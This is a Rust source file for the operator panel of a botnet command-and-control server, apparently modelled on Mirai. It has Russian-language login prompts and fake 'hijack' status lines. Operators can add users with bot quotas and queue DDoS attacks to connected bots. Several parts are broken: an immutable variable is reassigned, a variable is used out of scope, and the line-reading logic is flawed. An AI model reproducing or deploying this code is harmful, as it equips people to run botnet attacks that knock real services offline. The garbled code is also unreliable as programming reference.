use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::time::Duration;
use std::fs;
use std::str;
use std::error::Error;

struct Admin {
    conn: TcpStream,
}

impl Admin {
    fn new(conn: TcpStream) -> Self {
        Self { conn }
    }

    fn handle(&mut self) -> Result<(), Box<dyn Error>> {
        // Terminal control sequences
        self.conn.write_all(b"\x1B[?1049h")?;
        self.conn.write_all(b"\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22")?;

        let _cleanup = |conn: &mut TcpStream| {
            conn.write_all(b"\x1B[?1049l").ok();
        };

        let header = fs::read_to_string("prompt.txt")?;
        self.conn.write_all(header.replace("\r\n", "\n").replace("\n", "\r\n").as_bytes())?;

        // Get username
        self.conn.set_read_timeout(Some(Duration::new(60, 0)))?;
        self.conn.write_all(b"\x1B[34;1mпользователь\x1B[33;3m: \x1B[0m")?;
        let username = self.read_line(false)?;

        // Get password
        self.conn.set_read_timeout(Some(Duration::new(60, 0)))?;
        self.conn.write_all(b"\x1B[34;1mпароль\x1B[33;3m: \x1B[0m")?;
        let password = self.read_line(true)?;

        self.conn.set_read_timeout(Some(Duration::new(120, 0)))?;
        self.conn.write_all(b"\r\n")?;
        let spin_buf = ['-', '\\', '|', '/'];
        for i in 0..15 {
            self.conn.write_all(
                format!("\r\x1B[37;1mпроверив счета... \x1B[31m{}", spin_buf[i % spin_buf.len()]).as_bytes()
            )?;
            std::thread::sleep(Duration::from_millis(300));
        }

        let (logged_in, user_info) = database::try_login(&username, &password)?;
        if !logged_in {
            self.conn.write_all(b"\r\x1B[32;1mпроизошла неизвестная ошибка\r\n")?;
            self.conn.write_all(b"\x1B[31mнажмите любую клавишу для выхода. (any key)\x1B[0m")?;
            let mut buf = [0];
            self.conn.read_exact(&mut buf)?;
            return Ok(());
        }

        self.conn.write_all(b"\r\n\x1B[0m")?;
        self.conn.write_all(b"[+] DDOS | Succesfully hijacked connection\r\n")?;
        std::thread::sleep(Duration::from_millis(250));
        self.conn.write_all(b"[+] DDOS | Masking connection from utmp+wtmp...\r\n")?;
        std::thread::sleep(Duration::from_millis(500));
        self.conn.write_all(b"[+] DDOS | Hiding from netstat...\r\n")?;
        std::thread::sleep(Duration::from_millis(150));
        self.conn.write_all(b"[+] DDOS | Removing all traces of LD_PRELOAD...\r\n")?;
        for i in 0..4 {
            std::thread::sleep(Duration::from_millis(100));
            self.conn.write_all(format!("[+] DDOS | Wiping env libc.poison.so.{}\r\n", i + 1).as_bytes())?;
        }
        self.conn.write_all(b"[+] DDOS | Setting up virtual terminal...\r\n")?;
        std::thread::sleep(Duration::from_secs(1));

        // Spawn background thread
        let mut conn = self.conn.try_clone()?;
        std::thread::spawn(move || {
            let mut i = 0;
            loop {
                let bot_count = if client_list::count() > user_info.max_bots && user_info.max_bots != -1 {
                    user_info.max_bots
                } else {
                    client_list::count()
                };

                std::thread::sleep(Duration::from_secs(1));
                if let Err(_) = writeln!(conn, "\x1B]0;{} Bots Connected | {}\x07", bot_count, username) {
                    break;
                }
                i += 1;
                if i % 60 == 0 {
                    if let Err(_) = conn.set_read_timeout(Some(Duration::new(120, 0))) {
                        break;
                    }
                }
            }
        });

        self.conn.write_all(b"\x1B[37;1m[!] Sharing access IS prohibited!\r\n[!] Do NOT share your credentials!\r\n\x1B[36;1mReady\r\n")?;

        loop {
            self.conn.write_all(format!("\x1B[32;1m{}@botnet# \x1B[0m", username).as_bytes())?;
            let cmd = self.read_line(false)?;

            if cmd == "exit" || cmd == "quit" {
                return Ok(());
            }
            if cmd.is_empty() {
                continue;
            }

            let mut bot_count = user_info.max_bots;

            if user_info.admin == 1 && cmd == "adduser" {
                self.conn.write_all(b"Enter new username: ")?;
                let new_un = self.read_line(false)?;

                self.conn.write_all(b"Enter new password: ")?;
                let new_pw = self.read_line(false)?;

                self.conn.write_all(b"Enter wanted bot count (-1 for full net): ")?;
                let max_bots_str = self.read_line(false)?;
                let max_bots = max_bots_str.parse::<i32>()?;

                self.conn.write_all(b"Max attack duration (-1 for none): ")?;
                let duration_str = self.read_line(false)?;
                let duration = duration_str.parse::<i32>()?;

                self.conn.write_all(b"Cooldown time (0 for none): ")?;
                let cooldown_str = self.read_line(false)?;
                let cooldown = cooldown_str.parse::<i32>()?;

                self.conn.write_all(format!("New account info: \r\nUsername: {}\r\nPassword: {}\r\nBots: {}\r\nContinue? (y/N)", new_un, new_pw, max_bots_str).as_bytes())?;
                let confirm = self.read_line(false)?;
                if confirm != "y" {
                    continue;
                }

                if !database::create_user(new_un, new_pw, max_bots, duration, cooldown) {
                    self.conn.write_all(b"\x1B[31;1mFailed to create new user. An unknown error occured.\x1B[0m\r\n")?;
                } else {
                    self.conn.write_all(b"\x1B[32;1mUser added successfully.\x1B[0m\r\n")?;
                }
                continue;
            }

            if user_info.admin == 1 && cmd == "botcount" {
                let m = client_list::distribution();
                for (k, v) in m {
                    self.conn.write_all(format!("\x1B[36;1m{}:\t{}\x1B[0m\r\n", k, v).as_bytes())?;
                }
                continue;
            }

            if cmd.starts_with('-') {
                let mut count_split = cmd.splitn(2, ' ').collect::<Vec<&str>>();
                let count = &count_split[0][1..];
                bot_count = count.parse::<i32>()?;
                if user_info.max_bots != -1 && bot_count > user_info.max_bots {
                    self.conn.write_all(b"\x1B[31;1mBot count to send is bigger than allowed bot maximum\x1B[0m\r\n")?;
                    continue;
                }
                cmd = count_split[1];
            }

            if user_info.admin == 1 && cmd.starts_with('@') {
                let mut cata_split = cmd.splitn(2, ' ').collect::<Vec<&str>>();
                let bot_category = &cata_split[0][1..];
                cmd = cata_split[1];
            }

            let atk = NewAttack::new(&cmd, user_info.admin)?;
            let buf = atk.build()?;

            if !database::can_launch_attack(&username, atk.duration, &cmd, bot_count, 0)? {
                self.conn.write_all(format!("\x1B[31;1m{}\x1B[0m\r\n", "Error launching attack").as_bytes())?;
            } else if !database::contains_whitelisted_targets(&atk) {
                client_list::queue_buf(buf, bot_count, bot_category)?;
            } else {
                eprintln!("Blocked attack by {} to whitelisted prefix", username);
            }
        }
    }

    fn read_line(&mut self, masked: bool) -> Result<String, Box<dyn Error>> {
        let mut buf = vec![0; 1024];
        let mut buf_pos = 0;

        loop {
            let mut byte = [0];
            let n = self.conn.read(&mut byte)?;
            if n == 0 {
                return Err("Connection closed".into());
            }
            let byte = byte[0];

            if byte == 0xFF {
                let mut extra_byte = [0; 1];
                self.conn.read_exact(&mut extra_byte)?;
                buf_pos -= 1;
            } else if byte == 0x7F || byte == 0x08 {
                if buf_pos > 0 {
                    self.conn.write_all(&[byte])?;
                    buf_pos -= 1;
                }
                buf_pos -= 1;
            } else if byte == b'\r' || byte == b'\t' || byte == 0x09 {
                buf_pos -= 1;
            } else if byte == b'\n' || byte == 0x00 {
                self.conn.write_all(b"\r\n")?;
                return Ok(str::from_utf8(&buf[..buf_pos]).unwrap_or("").to_string());
            } else if byte == 0x03 {
                self.conn.write_all(b"^C\r\n")?;
                return Ok("".to_string());
            } else {
                if byte == 0x1B {
                    self.conn.write_all(b"^")?;
                    self.conn.write_all(&[byte])?;
                    buf_pos += 1;
                    buf[buf_pos] = b'[';
                    self.conn.write_all(&[buf[buf_pos]])?;
                } else if masked {
                    self.conn.write_all(b"*")?;
                } else {
                    self.conn.write_all(&[byte])?;
                }
            }
            buf_pos += 1;
        }
    }
}
